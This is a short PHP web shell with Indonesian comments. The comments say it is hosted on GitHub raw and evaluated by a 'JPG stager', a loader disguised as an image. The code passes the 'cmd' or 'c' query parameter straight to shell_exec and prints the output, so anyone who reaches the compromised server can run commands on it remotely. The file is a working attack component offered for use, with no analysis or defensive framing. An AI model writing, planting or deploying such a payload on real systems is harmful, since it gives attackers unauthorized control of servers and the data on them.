<?php
// File ini di host di GitHub raw
// Di-eval oleh JPG stager, $_GET masih accessible dari request asli
 
if(isset($_GET['cmd'])){
    echo shell_exec($_GET['cmd'].' 2>&1');
}
if(isset($_GET['c'])){
    echo shell_exec($_GET['c'].' 2>&1');
}
 
